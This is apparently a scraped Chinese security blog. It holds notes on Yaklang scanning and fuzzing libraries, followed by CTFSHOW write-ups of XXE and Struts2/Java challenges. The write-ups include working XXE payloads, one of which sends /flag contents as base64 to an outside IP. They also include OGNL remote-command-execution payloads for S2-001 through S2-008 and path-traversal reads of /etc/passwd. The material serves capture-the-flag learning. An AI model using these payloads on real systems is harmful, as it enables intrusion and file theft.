trueprintln(str.IsStrongPassword(&quot;abcdefghij.$t2Tk&quot;))  // true\n\n把域名或者IP+端口拼成一个网络地址\nprintln(str.HostPort(&quot;192.168.1.1&quot;, 80))println(str.HostPort(&quot;192.168.1.1&quot;, &quot;80&quot;))println(str.HostPort(&quot;example.com&quot;, 80))\n\n让IPV4退化成一个C段地址\nprintTwoResult(str.IPv4ToCClassNetwork(&quot;example.com&quot;))\n\n判断一个字符串是不是IPV4\nprintln(str.IsIPv4(&quot;127.0.0.1&quot;))\n\n判断一个字符串是不是IPV6\nprintln(str.IsIPv6(&quot;127.0.0.1&quot;))\n\n把字符串（URL/Addr）中的主机和端口解析出来\nprintHostPortErr(str.ParseStringToHostPort(&quot;example.com:80&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;127.0.0.1:80&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;https://example.com&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;http://example.com&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;http://example.com:8082&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;example.com&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;example&quot;))printHostPortErr(str.ParseStringToHostPort(&quot;127.0.0.1&quot;))/*OUTPUT:Host: example.com Port: 80\n\n把以,分割的字符串解析成主机信息，可解析内容为网段、IP、域名等。一般用于解析扫描目标主机。\nprintln(str.ParseStringToHosts(&quot;baidu.com,127.0.0.1,192.168.1.2/28&quot;))// OUTPUT// [baidu.com 127.0.0.1 192.168.1.0 192.168.1.1 192.168.1.2 192.168.1.3 192.168.1.4 192.168.1.5 192.168.1.6 192.168.1.7 192.168.1.8 192.168.1.9 192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.14 192.168.1.15]\n\n把字符串按行来分隔\ndump(str.ParseStringToLines(&quot;123123123\\nasdfasdf\\nwfhiuqwe\\nasdfasdf\\r\\nasdfasdf&quot;))\n\n把字符串（端口和端口的集合例如22,3306,8080-8088）解析成单独端口\nprintln(str.ParseStringToPorts(&quot;22,3306,80-82,8080-8083&quot;))println(str.ParseStringToPorts(&quot;8080-8083&quot;))println(str.ParseStringToPorts(&quot;22,xx&quot;))println(str.ParseStringToPorts(&quot;127.0.0.1/28&quot;))/*OUTPUT:[22 80 81 82 3306 8080 8081 8082 8083]\n\n把字符串（网络地址）转变为可能的标准格式的Url\nprintln(str.ParseStringToUrls(&quot;www.baidu.com&quot;))println(str.ParseStringToUrls(&quot;example.com&quot;))println(str.ParseStringToUrls(&quot;example.com:80&quot;))println(str.ParseStringToUrls(&quot;sdfaasdgasd&quot;))println(str.ParseStringToUrls(&quot;127.0.1.1&quot;))println(str.ParseStringToUrls(&quot;192.168.1.3:443&quot;))println(str.ParseStringToUrls(&quot;192.168.1.3:80&quot;))/*OUTPUT:[https://www.baidu.com http://www.baidu.com]\n\n把字符串（网络地址）转变为可能的标准格式的Url（可能以www作为域名开头）\nprintln(str.ParseStringToUrlsWith3W(&quot;example.com&quot;))println(str.ParseStringToUrlsWith3W(&quot;example.com:80&quot;))println(str.ParseStringToUrlsWith3W(&quot;sdfaasdgasd&quot;))[https://example.com https://www.example.com http://example.com http://www.example.com][http://example.com http://www.example.com][https://sdfaasdgasd https://www.sdfaasdgasd http://sdfaasdgasd http://www.sdfaasdgasd]\n\n随机生成一个指定长度的随机字符串，可作为密码\nfn str.RandSecret(var_1: int): string\n\n随机生成一个指定长度字符串\nfn str.RandStr(var_1: int): string\n\n\n\n编码解码库 codec\n\n不可见字符打印编码（ASCII）\n\n\nBase64编码解码\n\n\nHTML实体编码 \n\n\nUrl 编码\n\n只编码需要编码的字符/字符串？\n\n\n双URL编码，常用于XSS\n\n\n十六进制编码\n如果这个十六进制字符串需要在 mysql 中展示，记得加 0x 前缀\n\n\nAES/DES加密编解码\n\nHash计算与编码\n\n\n\n文件操作与IO库 file\nhttps://www.yaklang.io/docs/buildinlibs/lib_file\nexp\n\n创建文件\n// file.OpenFile(var1: string, mode: int, perm: int)// 创建简单的文件f, err := file.OpenFile(&quot;_testFile.txt&quot;, file.O_CREATE|file.O_RDWR, 0777)die(err)f.Write(&quot;we write some Message \\n\\n\\n\\n\\nasdfahsdfasdf Now\\n&quot;)f.Close()// 像 cat 一样，把文件打印出来到屏幕上file.Cat(&quot;_testFile.txt&quot;)// 移除文件file.Rm(&quot;_testFile.txt&quot;)\n创建临时文件\n// file.TempFile(dir: string)// 创建一个临时文件f, err := file.TempFile(&quot;&quot;)die(err)println(&quot;我们创建了一个临时文件：&quot;, f.Name())// 往临时文件中写一个字符串println(&quot;写入一点随机字符串&quot;)f.Write(&quot;asdfasdf&quot;)// 记得脚本结束要关闭文件defer f.Close()// 我们验证我们的内容写成功了没？raw,  err := file.ReadFile(f.Name())die(err)println(&quot;我们写入的文件内容为：&quot;)// 展示写的结果dump(raw)\n\n文件删除\n// file.Remove 或者 file.RmfileName = &quot;target-filename.txt&quot;file.Remove(fileName)file.Rm(fileName)\n\n文件移动\nfile.Rename(oldName, newName string)file.Mv(oldName: string, newName)\n\n文件按行读写\nf, err := file.Open(&quot;12_fileio.yak&quot;)die(err)dump(f.ReadLines())f.Close()\n\n\n\n系统读写工具库 io \n遇到再说 https://www.yaklang.io/docs/buildinlibs/lib_io\n\n正则工具库 re\n\nre.Match\n检查字符串\n// 我们构建一个 matchpattern := `matchThis(.*?)txt`// 我们随便写一个字符串result := re.Match(pattern, `asdfas sdfa sdfadsfasdfk;iopu34matchMatchMatchmatchThisasdfnkaopjryqeryjklijklojkloptxt`)if !result &#123;    die(&quot;failed to match re:&quot;)&#125;printf(&quot;pattern: %v 匹配成功\\n&quot;, pattern)/*OUTPUT:pattern: matchThis(.*?)txt 匹配成功*/\n检查字节流\npattern := `matchThis(.*?)txt`result := re.Match(pattern, []byte(`asdfas sdfa sdfadsfasdfk;iopu34matchMatchMatchmatchThisasdfnkaopjryqeryjklijklojkloptxt`))if !result &#123;    die(&quot;failed to match re:&quot;)&#125;printf(&quot;pattern: %v 匹配成功\\n&quot;, pattern)/*OUTPUT:pattern: matchThis(.*?)txt 匹配成功*/\n\n\n\n操作系统库 os\nhttps://www.yaklang.io/docs/buildinlibs/lib_os\n\nTCP 网络连接库 tcp\n\nexp\n// 设置日志的级别，方便我们看到 TCP 库的一些信息输出loglevel(&quot;info&quot;)// 启动一个 TCP 服务器，在 Goroutine 中异步启动go fn&#123;    tcp.Serve(&quot;127.0.0.1&quot;, 8085, tcp.serverCallback(func(conn) &#123;        println(&quot;真正的 TCP 服务器收到一个连接：&quot;, conn.RemoteAddr())        bytes, err := conn.RecvLen(4)        if err != nil &#123;            conn.Close()            return        &#125;        println(&quot;收到连接的前 4 个字符为&quot;, string(bytes))        println(&quot;发送一个 Hello World 给客户端&quot;)        conn.Send(&quot;你好，世界！Hello World from 127.0.0.1:8085&quot;)        println(&quot;发送成功了！&quot;)        conn.Close()    &#125;))&#125;// 启动一个 TCP 本地转发，把本地 9000 转发到 127.0.0.1:8085go fn&#123;    tcp.Forward(9000, &quot;127.0.0.1&quot;, 8085)&#125;// 启动一个 TCP 连接，直接访问本地 9000 端口conn, err := tcp.Connect(&quot;127.0.0.1&quot;, 9000)die(err)// 发送一个消息给 9000 端口conn.Send(&quot;abdasdf this message from client&quot;)dump(conn.RecvStringTimeout(1))// 等待3秒观察日志sleep(3)\n\n模糊测试工具库 fuzz\n\n模糊测试字符串\nfn fuzz.Strings(origin: string) []string\n这个函数会把核心的 &#123;&#123; &#125;&#125; 标签转变为需要渲染的内容\nexp\norigin := &quot;&#123;&#123;int(1,3,4,80-88)&#125;&#125;&quot;res := fuzz.Strings(origin)println(&quot;需要模糊渲染的字符串为：&quot;, origin)println(&quot;渲染结果为：&quot;)dump(res)/*OUTPUT:需要模糊渲染的字符串为： &#123;&#123;int(1,3,4,80-88)&#125;&#125;渲染结果为：([]string) (len=12 cap=12) &#123; (string) (len=1) &quot;1&quot;, (string) (len=1) &quot;3&quot;, (string) (len=1) &quot;4&quot;, (string) (len=2) &quot;80&quot;, (string) (len=2) &quot;81&quot;, (string) (len=2) &quot;82&quot;, (string) (len=2) &quot;83&quot;, (string) (len=2) &quot;84&quot;, (string) (len=2) &quot;85&quot;, (string) (len=2) &quot;86&quot;, (string) (len=2) &quot;87&quot;, (string) (len=2) &quot;88&quot;&#125;*/\n\nfuzz 标签定义以及使用\n\n在同一个渲染的字符串中，完全相同的标签不会做排列组合，而是被渲染成相同的元素。如果真的需要标签渲染内容完全相同，并且需要分别渲染，可以在标签函数功能后增加一个数字，例如 &#123;&#123;int1()&#125;&#125;, &#123;&#123;int2()&#125;&#125; 这两个标签同 &#123;&#123;int()&#125;&#125; 完全等效，但是可以分别渲染。\n\n\n基础标签\n&#123;&#123;int&#125;&#125; 渲染整数/端口\n最常用的用户其实是渲染一个端口，端口组；如果我们想要爆破密码的时候，生成密码也可以使用这个标签。\n&#123;&#123;net&#125;&#125;/&#123;&#123;host&#125;&#125; 渲染扫描目标\n本质上和 str.ParseStringToHosts 一样\n\n我们会把目标拆分成多个主机，支持网段，域名，IP 等。解析结果都是以 , 为分割的。\n\n经典配合&#123;&#123;int&#125;&#125;使用，批量生成URL\norigin := &quot;http://&#123;&#123;net(176.1.0.1/28,example.com)&#125;&#125;:&#123;&#123;port(8080)&#125;&#125;/admin.php&quot;res := fuzz.Strings(origin)println(&quot;需要模糊渲染的字符串为：&quot;, origin)println(&quot;渲染结果为：&quot;)dump(res)\n&#123;&#123;randstr&#125;&#125;生成随机字符串\n生成一个随机字符串，只包含二十六个英文字母大小写\n\n&#123;&#123;randint&#125;&#125;生成随机数字\n\n&#123;&#123;char&#125;&#125; 指定生成单个字符\nfor _, r := range fuzz.Strings(&quot;生成一字符为:&#123;&#123;char(a-f)&#125;&#125;&quot;) &#123;    println(r)&#125;\n&#123;&#123;punctuation&#125;&#125; / &#123;&#123;punc&#125;&#125; Fuzz 所有可见标点符号\n将会被替换为[&lt; &gt; ? , . / : &quot; ; &#39; &#123; &#125; [ ] | \\ _ + - = ) ( * &amp; ^ % $ # @ !]`\n&#123;&#123;rangechar&#125;&#125; 制定生成任意字符\n有时还需要生成一些不可见字符\n\n【编码标签】&#123;&#123;md5&#125;&#125; &#123;&#123;sha1&#125;&#125; &#123;&#123;sha256&#125;&#125; &#123;&#123;sha512&#125;&#125;\n支持嵌套\n【编码标签】&#123;&#123;base64&#125;&#125; &#123;&#123;hex&#125;&#125; &#123;&#123;url&#125;&#125; &#123;&#123;durl&#125;&#125; &#123;&#123;html&#125;&#125; &#123;&#123;htmlhex&#125;&#125;\n\n\nFuzz Http 请求\n\n通过 fuzz.HTTPRequest 这个接口可以创建一个 HTTP 请求，这个请求可以支持 Fuzz 相关操作。\n\nfunc fuzz.HTTPRequest(params: *http.Request|[]byte|string) (*FuzzHTTPRequest, error)\nexp\n/*构筑 FuzzHTTPRequest*/// 我们构建一个基础数据包，这个数据包是标准 http 请求构建的req, err := http.NewRequest(&quot;GET&quot;, &quot;http://127.0.0.1:8080&quot;)die(err)// 我们自定义个数据包的具体内容，虽然他不标准，但是仍然可以被解析和使用，这点非常棒reqBody := `GET / HTTP/1.1Host: 127.0.0.1:8082`for _, params := range [    []byte(reqBody),            // 测试 []byte / []uint8 类型的数据包是否能被使用    reqBody,                    // 测试 string 数据包是否能被使用    req,                        // 测试 *http.Request 是否能被正常解析] &#123;    req, err := fuzz.HTTPRequest(params)    if err != nil &#123;        /* 如果解析失败，将会直接在这里打印出失败的原因和原来参数 */        println(&quot;参数错误: &quot;)        dump(params)        die(err)    &#125; else &#123;        println(str.f(&quot;接收 %v 数据包成功&quot;, type(params)))    &#125;&#125;\n返回值信息 https://www.yaklang.io/docs/buildinlibs/lib_fuzz#%E6%A0%B9%E6%8D%AE%E4%B8%80%E5%A0%86-url-%E6%89%B9%E9%87%8F%E6%9E%84%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%8C%85\n那么如何对一大批url进行批量测试？\n利用fuzz.UrlsToHTTPRequests\n单个\n// fuzz.UrlsToHTTPRequests 案例1reqGroup, err = fuzz.UrlsToHTTPRequests(&quot;http://127.0.0.1:8082&quot;)die(err)// 获取 Fuzz 的结果reqs, err := reqGroup.Results()die(err)// 展示构造后的数据包for _, req := range reqs &#123;    http.show(req)&#125;/*OUTPUTGET / HTTP/1.1Host: 127.0.0.1:8082Content-Length: 0*/\n多个\nprintln(&quot;----------&quot;)// fuzz.UrlsToHTTPRequests 案例urls = `http://127.0.0.1:8082http://127.0.0.1:8083http://127.0.0.1:8084http://127.0.0.1:8085`reqGroup, err = fuzz.UrlsToHTTPRequests(str.ParseStringToLines(urls)...)die(err)reqs, err := reqGroup.Results()die(err)for _, req := range reqs &#123;    http.show(req)&#125;\n优化版本\nprintln(&quot;----------&quot;)// fuzz.UrlsToHTTPRequests 案例urls = `http://127.0.0.1:808&#123;&#123;int(5-8)&#125;&#125;http://127.0.0.1:8082`reqGroup, err = fuzz.UrlsToHTTPRequests(str.ParseStringToLines(urls)...)die(err)reqs, err := reqGroup.Results()die(err)for _, req := range reqs &#123;    http.show(req)&#125;\n\n\n链式调用 Fuzz一个HTTPRequest\nhttps://www.yaklang.io/docs/buildinlibs/lib_fuzz#%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%EF%BC%9A%E5%A6%82%E4%BD%95-fuzz-%E4%B8%80%E4%B8%AA-httprequest%EF%BC%9F\n\n批量发起Fuzz过的请求\nhttpool.Pool(i *FuzzHTTPRequest|[]*http.Request, opts...) (chan map[string]interface&#123;&#125;, error)\nexp\n// 批量发起请求req, err := fuzz.HTTPRequest(`GET /path-target HTTP/1.1Host: 127.0.0.1:8082`)die(err)fReq := req.FuzzPath(&quot;/admin/admin&#123;&#123;int(1-4)&#125;&#125;.php&quot;)ch, err := httpool.Pool(fReq)die(err)for result := range ch &#123;    dump(result)    println(&quot;-------------------------------------&quot;)&#125;\n\n\n\n\n\nHTTP库 http\nAPI 如下 https://www.yaklang.io/docs/buildinlibs/lib_http#%E6%89%80%E6%9C%89-api\n\n从命令行读参数 cli\ncli.Args()\n处理不同类型的参数值 cli.String() / cli.Bool() / cli.Int \n\nservicescan 服务指纹扫描\n\n\n网络空间引擎 spaceengine\nhttps://www.yaklang.io/docs/buildinlibs/lib_spacengine#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B\n配合servicescan 使用\napiKey := cli.String(&quot;token&quot;)res, err := spacengine.ShodanQuery(apiKey, &quot;jenkins&quot;, spacengine.maxRecord(100))die(err)fpRes, err := servicescan.ScanFromSpaceEngine(res)die(err)for result := range fpRes &#123;    println(result)&#125;\n\n子域名收集\nres, err := subdomain.Scan(&quot;b******u.com&quot; , subdomain.recursive(true ) )die(err)for result := range res &#123;    result.Show()&#125;\n\n赋予Yak漏扫能力\nnuclei.Scan\n\n\n\n参考链接https://www.yaklang.io/docs/buildinlibs/lib_str#f\n","tags":["渗透测试"]},{"title":"CTFSHOW-XXE","url":"/2022/11/14/ctfshow-XXE/","content":"前置知识https://xz.aliyun.com/t/3357\n一些关键要点：\n原理：在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）\n\nweb373 开x\n题目给出了源码，应该就是XXE的一个最基本的可触发漏洞场景，我们分析一下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-07 12:59:52# @Last Modified by:   h1xa# @Last Modified time: 2021-01-07 13:36:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);// 可通过POST传参if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $ctfshow = $creds-&gt;ctfshow;    echo $ctfshow;&#125;highlight_file(__FILE__);\n首先libxml_disable_entity_loader()\n\nDisable/enable the ability to load external entities. Note that disabling the loading of external entities may cause general issues with loading XML documents. However, as of libxml 2.9.0 entity substitution is disabled by default, so there is no need to disable the loading of external entities, unless there is the need to resolve internal entity references with LIBXML_NOENT. Generally, it is preferable to use libxml_set_external_entity_loader() to suppress loading of external entities.\n\n两个参数LIBXML_NOENT 和 LIBXML_DTDLOAD\nLIBXML_NOENT (int)\tSubstitute entities\t警告\tEnabling entity substitution may facilitate XML External Entity (XXE) \t  attacks.LIBXML_DTDLOAD (int)\tLoad the external subset\nsimplexml_import_dom()\n\nThis function takes a node of a DOM document and makes it into a SimpleXML node. This new object can then be used as a native SimpleXML element.\n\n其中会输出creds结点下ctfshow子结点的值，因此可构造形式如下\n&lt;ctfshow&gt;xxx&lt;/ctfshow&gt;\n由于可利用回显，我们可以直接外部实体注入，回显点在ctfshow实体。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;creds&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/creds&gt;\n\nweb374. 开x\n先看源码\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-07 12:59:52# @Last Modified by:   h1xa# @Last Modified time: 2021-01-07 13:36:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); \n这里可以看到不再会有获取XML结点并输出实体的操作，也就是无回显的场景。需要考虑外带参数，利用参数的实体注入\ntest.dtd\n&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://43.140.198.45:81?p=%file;&#x27;&quot;&gt;\npayload:\n&lt;!DOCTYPE xxe [ &lt;!ENTITY % remote SYSTEM &quot;http://43.140.198.45:81/XXE&quot;&gt;%remote;%int;%send;]&gt;\n\n这里调用顺序就是先加载本地参数实体remote，然后向vps发送请求test.dtd。后者请求到后加载实体int，由于其中又引用了实体file，所以会触发本地请求（通过伪协议+file协议）flag文件替换原来的参数实体，最后加载send，将p参数及本地请求结果回传至vps\n\nweb375. 开x\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-07 12:59:52# @Last Modified by:   h1xa# @Last Modified time: 2021-01-07 15:22:05# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); \n可以看到其中加入了黑名单检验xml头&lt;?xml version=&quot;1.0&quot;\n可以利用参数外带的方式继续打\n\nweb376. 开x\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-07 12:59:52# @Last Modified by:   h1xa# @Last Modified time: 2021-01-07 15:23:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);    \n加入了忽略大小写，继续\n\nweb377. 开x\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-07 12:59:52# @Last Modified by:   h1xa# @Last Modified time: 2021-01-07 15:26:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;|http/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);\n可以看到ban了http关键词，这里采用编码绕过\nimport requestsurl = &quot;http://bc5cb52a-f981-471a-8e5c-606ec32abb66.challenge.ctf.show/&quot;data = &quot;&quot;&quot;&lt;!DOCTYPE xxe [ &lt;!ENTITY % remote SYSTEM &quot;http://43.140.198.45:81/XXE&quot;&gt;%remote;%int;%send;]&gt;&quot;&quot;&quot;r = requests.post(url, data=data.encode(&#x27;utf-16&#x27;))\n\nweb378. pythonx\n打开题面后，源码中存在js\nfunction doLogin()&#123;\tvar username = $(&quot;#username&quot;).val();\tvar password = $(&quot;#password&quot;).val();\tif(username == &quot;&quot; || password == &quot;&quot;)&#123;\t\talert(&quot;Please enter the username and password!&quot;);\t\treturn;\t&#125;\t\tvar data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;;     $.ajax(&#123;        type: &quot;POST&quot;,        url: &quot;doLogin&quot;,        contentType: &quot;application/xml;charset=utf-8&quot;,        data: data,        dataType: &quot;xml&quot;,        anysc: false,        success: function (result) &#123;        \tvar code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;        \tvar msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;        \tif(code == &quot;0&quot;)&#123;        \t\t$(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);        \t&#125;else if(code == &quot;1&quot;)&#123;        \t\t$(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);        \t&#125;else&#123;        \t\t$(&quot;.msg&quot;).text(&quot;error:&quot; + msg);        \t&#125;        &#125;,        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;            $(&quot;.msg&quot;).text(errorThrown + &#x27;:&#x27; + textStatus);        &#125;    &#125;); &#125;\n可以看到username和password可控且直接拼接到xml当中，存在xxe，且可以直接回显。\n\t\t\t&lt;!DOCTYPE xxe [ &lt;!ENTITY cmd SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;cmd;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-JAVA","url":"/2022/10/01/ctfshow-java/","content":" 终于到了JAVA部分\n\nweb279. S2-001   打开题面之后跳转到http://61190dad-607d-4ccf-a652-f630921cbd1b.challenge.ctf.show/S2-001/   测试一下%&#123;1+1&#125;发现表达式存在解析   直接利用脚本https://github.com/HatBoy/Struts2-Scan/   python3 Struts2Scan.py -u http://61190dad-607d-4ccf-a652-f630921cbd1b.challenge.ctf.show/S2-001/login.actionpython3 Struts2Scan.py -u http://61190dad-607d-4ccf-a652-f630921cbd1b.challenge.ctf.show/S2-001/login.action -n S2-001 --exec\n   flag位于环境变量当中，所以直接利用env   一些常用获取信息的表达式    // 获取tomcat路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;// 获取web路径%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;// 命令执行 env，flag就在其中password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;\nweb280. S2-005题面开头存在url跳转，可以看到有参数注入点   POC   (%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27)(racerz)(racerz)&amp;(%27%5Cu0023_memberAccess.acceptProperties%5Cu003d@java.util.Collections@EMPTY_SET%27)(racerz)(racerz)&amp;(%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27)(racerz)(racerz)&amp;(%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27)(racerz)(racerz)&amp;(&#x27;%5Cu0040java.lang.Runtime%40&#x27;%2B&#x27;getRuntime().exec(%5Cu0023aa)&#x27;)(%5Cu0023aa%5Cu003d&#x27;open%5Cu0020-a%5Cu0020Calculator.app&#x27;)(&#x27;racerz&#x27;)\nweb281. S2-007   类型转换时错误会导致保存参数至stack和context，而在解析标签时会重新导入并执行OGNL解析   POC&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=new java.lang.Boolean(&quot;false&quot;),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;\nweb282. S2-008   这个编号有好几个洞，比较鸡肋。其中能RCE的需要开启devmode调试模式，通过参数debug=console或debug=browser&amp;object=或debug=command&amp;expression=可执行任意OGNL表达式   这个题貌似只有最后一个可以，其他没回显（可能是没页面跳转）   POC   debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dnew%20java.lang.Boolean(%22false%22)%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;env&#x27;).getInputStream()))\nweb298. 看看代码，了解下和php不一样的地方   给了一个jar包，直接看看路由，有login{:height 185, :width 572}   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        response.setContentType(&quot;text/html&quot;);        PrintWriter out = response.getWriter();        String username = request.getParameter(&quot;username&quot;);        String password = request.getParameter(&quot;password&quot;);        User user = new User(username, password);        if (username == &quot;admin&quot;) &#123;            out.print(&quot;you are not admin&quot;);        &#125; else if (user.getVipStatus()) &#123;            out.print(&quot;you are login&quot;);            String flag = Util.readFlag(&quot;/flag&quot;);            out.print(flag);        &#125; else &#123;            out.print(&quot;login failed&quot;);        &#125;        out.flush();        out.close();    &#125;//////////////////////////////////////////////////////////////////////////////////////////////public boolean getVipStatus() &#123;        return this.username.equals(&quot;admin&quot;) &amp;&amp; this.password.equals(&quot;ctfshow&quot;);    &#125;\n   虽然不知道咋能直接绕过admin，但是确实只要满足username=admin&amp;password=ctfshow即可\nweb299. 了解为主   源码中存在提示   有个文件读取接口，试着读一下配置文件`WEB-INF/web.xml   &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app version=&quot;3.0&quot; \txmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; \txmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; \txsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee \thttp://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;&gt;    &lt;display-name&gt;&lt;/display-name&gt;    &lt;servlet&gt;        &lt;description&gt;This is the description of my J2EE component&lt;/description&gt;        &lt;display-name&gt;This is the display name of my J2EE component&lt;/display-name&gt;        &lt;servlet-name&gt;ViewSourceServlet&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.ctfshow.servlet.ViewSourceServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet&gt;        &lt;description&gt;This is the description of my J2EE component&lt;/description&gt;        &lt;display-name&gt;This is the display name of my J2EE component&lt;/display-name&gt;        &lt;servlet-name&gt;GetFlag&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.ctfshow.servlet.GetFlag&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;       &lt;servlet-name&gt;ViewSourceServlet&lt;/servlet-name&gt;       &lt;url-pattern&gt;/view-source&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;  &lt;servlet-mapping&gt;      &lt;servlet-name&gt;GetFlag&lt;/servlet-name&gt;      &lt;url-pattern&gt;/getFlag&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;\t    &lt;welcome-file-list&gt;        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;    &lt;/welcome-file-list&gt;&lt;/web-app&gt;\n   可以看到有个GetFlag类，试着直接读源码WEB-INF/classes/com/ctfshow/servlet/GetFlag.class   其中可以看到flag文件路径，直接读   先利用..找到根目录 -&gt; ../../../../../etc/passwd   然后直接读flag即可../../../../../fl3g\nweb 300. java告一段落   同上，../../../../../f1bg\nweb 283.  Struts2 showcase远程代码执行漏洞 S2-009   漏洞成因就是黑名单验证只针对参数名而未针对参数值，那么将OGNL写到参数值中，再通过OGNL-context上下文直接调用就行（因为参数上下文信息初始时是直接写到了action stack的root中）   POC   